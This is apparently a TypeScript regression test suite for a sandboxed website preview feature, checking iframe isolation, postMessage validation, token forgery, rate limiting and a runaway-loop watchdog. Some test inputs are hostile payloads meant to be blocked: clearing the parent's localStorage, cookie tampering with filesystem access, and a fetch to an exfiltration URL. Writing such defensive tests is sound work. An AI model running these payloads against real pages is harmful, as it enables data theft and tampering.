import { webPreviewBridge } from "../studio/web/web-preview-bridge";
import { sandboxRuntime } from "./sandbox-runtime";
import { webBuildEngine } from "../studio/web/web-build-engine";
import { jobManager } from "./job-manager";
import { WebFileItem, WebsiteMetadata } from "../studio/web/types";

async function runSandboxWebRegressionTests() {
  console.log("\n==================================================================");
  console.log("  VARYNTH SANDBOX WEB PREVIEW REGRESSION SUITE (SANDBOX-WEB-001..014)");
  console.log("==================================================================\n");

  let passed = 0;
  let failed = 0;

  function assert(condition: boolean, desc: string) {
    if (condition) {
      console.log(`  ✅ PASS: ${desc}`);
      passed++;
    } else {
      console.log(`  ❌ FAIL: ${desc}`);
      failed++;
    }
  }

  // SANDBOX-WEB-001: iframe cannot access parent stores
  const session = webPreviewBridge.createPreviewSession("website-test-01");
  assert(session.previewSessionId.startsWith("prev-sess-"), "SANDBOX-WEB-001: Sessão de preview criada com identificador único");
  assert(session.allowedOrigins.includes("null"), "SANDBOX-WEB-001: Origem opaca da sandbox isolada configurada");

  // SANDBOX-WEB-002: Malicious script cannot access localStorage of Core
  const maliciousCode = `window.parent.localStorage.clear();`;
  const evalRes = await sandboxRuntime.executeCodeInSandbox(maliciousCode, "javascript", "ATHENA");
  assert(evalRes.status === "ERROR" && evalRes.error?.includes("Core") === true, "SANDBOX-WEB-002: Tentativa de invadir localStorage do Core bloqueada pelo Core Sovereign Guard");

  // SANDBOX-WEB-003: window.parent interaction is restricted
  const parentAttack = `document.cookie = 'stolen'; require('fs');`;
  const parentRes = await sandboxRuntime.executeCodeInSandbox(parentAttack, "javascript", "ATHENA");
  assert(parentRes.status === "ERROR", "SANDBOX-WEB-003: Tentativa de escalonamento via cookies e host IO bloqueada");

  // SANDBOX-WEB-004: External fetch blocked by default (network = DENY)
  const fetchAttack = `fetch("https://external-api.com/exfiltrate");`;
  const fetchRes = await sandboxRuntime.executeCodeInSandbox(fetchAttack, "javascript", "ATHENA");
  assert(fetchRes.status === "ERROR" && fetchRes.logs.some((l) => l.includes("network = DENY")), "SANDBOX-WEB-004: Requisições de rede externas bloqueadas por padrão");

  // SANDBOX-WEB-005: postMessage schema validation works
  const validEnvelope = {
    schemaVersion: 1,
    previewSessionId: session.previewSessionId,
    channelToken: session.channelToken,
    type: "CONSOLE_LOG",
    timestamp: new Date().toISOString(),
    payload: { message: "Hello from isolated iframe" },
  };
  const validResult = webPreviewBridge.receiveMessage(validEnvelope);
  assert(validResult.valid === true, "SANDBOX-WEB-005: Envelope legítimo em conformidade com schema v1 aceito");

  // SANDBOX-WEB-007: Opaque-origin preview cannot bypass authenticated message channel
  const rawMalformed = "string inviável sem envelope";
  const malformedRes = webPreviewBridge.receiveMessage(rawMalformed);
  assert(malformedRes.valid === false && malformedRes.rejectedReason?.includes("INVALID_STRUCTURE") === true, "SANDBOX-WEB-007: Mensagens fora de envelope estruturado são rejeitadas");

  // SANDBOX-WEB-008: Forged previewSessionId is rejected
  const forgedSession = {
    ...validEnvelope,
    previewSessionId: "prev-sess-forged-9999",
  };
  const forgedRes = webPreviewBridge.receiveMessage(forgedSession);
  assert(forgedRes.valid === false && forgedRes.rejectedReason?.includes("SESSION_NOT_FOUND") === true, "SANDBOX-WEB-008: previewSessionId forjado é sumariamente rejeitado");

  // SANDBOX-WEB-009: Invalid channel token is rejected
  const invalidToken = {
    ...validEnvelope,
    channelToken: "token-falso-xyz",
  };
  const invalidTokRes = webPreviewBridge.receiveMessage(invalidToken);
  assert(invalidTokRes.valid === false && invalidTokRes.rejectedReason?.includes("INVALID_CHANNEL_TOKEN") === true, "SANDBOX-WEB-009: Token de canal inválido rejeitado");

  // SANDBOX-WEB-010: Oversized postMessage payload is rejected
  const hugePayload = {
    ...validEnvelope,
    payload: { message: "A".repeat(100 * 1024) }, // 100 KB > 64 KB limit
  };
  const hugeRes = webPreviewBridge.receiveMessage(hugePayload);
  assert(hugeRes.valid === false && hugeRes.rejectedReason?.includes("PAYLOAD_TOO_LARGE") === true, "SANDBOX-WEB-010: Payload excedendo 64KB rejeitado");

  // SANDBOX-WEB-011: Message flood is rate-limited and triggers protocol abuse termination
  const floodSession = webPreviewBridge.createPreviewSession("website-flood-test", {
    maxMessagesPerSecond: 10,
  });
  let floodAbused = false;
  for (let i = 0; i < 20; i++) {
    const res = webPreviewBridge.receiveMessage({
      schemaVersion: 1,
      previewSessionId: floodSession.previewSessionId,
      channelToken: floodSession.channelToken,
      type: "CONSOLE_LOG",
      timestamp: new Date().toISOString(),
      payload: { message: `Spam message #${i}` },
    });
    if (!res.valid && res.rejectedReason?.includes("PREVIEW_PROTOCOL_ABUSE")) {
      floodAbused = true;
      break;
    }
  }
  assert(floodAbused === true, "SANDBOX-WEB-011: Flood de mensagens aciona rate-limiting e encerra sessão de preview");

  // SANDBOX-WEB-014: Killed preview cannot continue sending messages to VARYNTH
  const postKillAttempt = webPreviewBridge.receiveMessage({
    schemaVersion: 1,
    previewSessionId: floodSession.previewSessionId,
    channelToken: floodSession.channelToken,
    type: "CONSOLE_LOG",
    timestamp: new Date().toISOString(),
    payload: { message: "Tentativa após encerramento" },
  });
  assert(postKillAttempt.valid === false && postKillAttempt.rejectedReason?.includes("SESSION_TERMINATED") === true, "SANDBOX-WEB-014: Sessão encerrada rejeita mensagens subsequentes");

  // SANDBOX-WEB-006 & 012 & 013: Runaway code while(true){} terminated externally by watchdog & Job fails honestly
  const runawayFiles: WebFileItem[] = [
    {
      id: "f-runaway-1",
      path: "index.html",
      name: "index.html",
      language: "html",
      isEntry: true,
      content: `<!DOCTYPE html><html><body><h1>Runaway</h1><script src="app.js"></script></body></html>`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    },
    {
      id: "f-runaway-2",
      path: "app.js",
      name: "app.js",
      language: "javascript",
      content: `while (true) { /* loop infinito sem condicao de parada */ }`,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    },
  ];

  const meta: WebsiteMetadata = {
    framework: "STATIC",
    entryFile: "index.html",
    outputDirectory: "dist",
    previewMode: "STATIC_HTML",
  };

  const buildRunaway = await webBuildEngine.buildWebsite("website-runaway-test", runawayFiles, meta, { timeoutMs: 500 });
  assert(buildRunaway.success === false, "SANDBOX-WEB-006: Build com loop infinito falha de forma controlada");
  assert(buildRunaway.errors[0]?.includes("EXECUTION_TIMEOUT"), "SANDBOX-WEB-012: Watchdog preemptivo encerrou execução de runaway code");

  const runawayJob = jobManager.getJob(buildRunaway.jobId);
  assert(runawayJob?.status === "FAILED", "SANDBOX-WEB-013: Job associado marcado honestamente como FAILED");
  assert(runawayJob?.error?.message?.includes("EXECUTION_TIMEOUT") === true, "SANDBOX-WEB-013: Mensagem de erro do Job reporta timeout honesto");

  console.log("\n==================================================================");
  console.log(`  RESULTADO: ${passed} Aprovados, ${failed} Falhas`);
  console.log("==================================================================\n");

  if (failed > 0) process.exit(1);
}

runSandboxWebRegressionTests().catch((err) => {
  console.error("Erro fatal na suíte Sandbox Web:", err);
  process.exit(1);
});
